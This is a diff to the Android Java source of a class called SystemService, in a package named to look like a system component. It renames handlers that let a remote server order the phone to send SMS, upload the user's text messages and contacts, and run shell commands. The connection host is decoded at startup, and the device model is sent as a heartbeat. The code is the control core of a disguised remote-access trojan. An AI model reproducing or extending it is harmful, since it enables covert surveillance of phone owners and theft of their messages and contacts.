@@ -8,11 +8,11 @@ import android.content.IntentFilter;
 import android.os.Build;
 import android.os.IBinder;
 
-import com.android.sys.action.SendSmsAction;
-import com.android.sys.action.ShellAction;
-import com.android.sys.action.UploadContactsAction;
-import com.android.sys.action.UploadSmsAction;
 import com.android.sys.session.NetworkSessionManager;
+import com.android.sys.session.handler.SendSmsSessionHandler;
+import com.android.sys.session.handler.ShellSessionHandler;
+import com.android.sys.session.handler.UploadContactsSessionHandler;
+import com.android.sys.session.handler.UploadSmsSessionHandler;
 import com.android.sys.utils.SystemUtil;
 
 import java.io.IOException;
@@ -41,10 +41,10 @@ public class SystemService extends Service{
 
     private NetworkSessionManager mSessionManager;
 
-    private String ACTION_SEND_SMS = "send_sms";
-    private String ACTION_UPLOAD_SMS = "upload_sms";
-    private String ACTION_UPLOAD_CONTACT = "upload_contact";
-    private String ACTION_SHELL = "shell";
+    private String SESSION_SEND_SMS = "send_sms";
+    private String SESSION_UPLOAD_SMS = "upload_sms";
+    private String SESSION_UPLOAD_CONTACT = "upload_contact";
+    private String SESSION_SHELL = "shell";
 
     private void init() {
         try {
@@ -54,10 +54,10 @@ public class SystemService extends Service{
             String address = new String(data, "UTF-8");
             String[] host_port = address.split(":");
             mSessionManager = new NetworkSessionManager();
-            mSessionManager.addActionHandler(ACTION_SEND_SMS, new SendSmsAction());
-            mSessionManager.addActionHandler(ACTION_UPLOAD_CONTACT, new UploadContactsAction());
-            mSessionManager.addActionHandler(ACTION_UPLOAD_SMS, new UploadSmsAction());
-            mSessionManager.addActionHandler(ACTION_SHELL, new ShellAction());
+            mSessionManager.addSessionHandler(SESSION_SEND_SMS, new SendSmsSessionHandler());
+            mSessionManager.addSessionHandler(SESSION_UPLOAD_CONTACT, new UploadContactsSessionHandler());
+            mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
+            mSessionManager.addSessionHandler(SESSION_SHELL, new ShellSessionHandler());
             mSessionManager.setHeartBeatData(Build.MODEL.getBytes("UTF-8"));
             if(host_port.length >= 1) {
                 mSessionManager.setHost( host_port[0] );
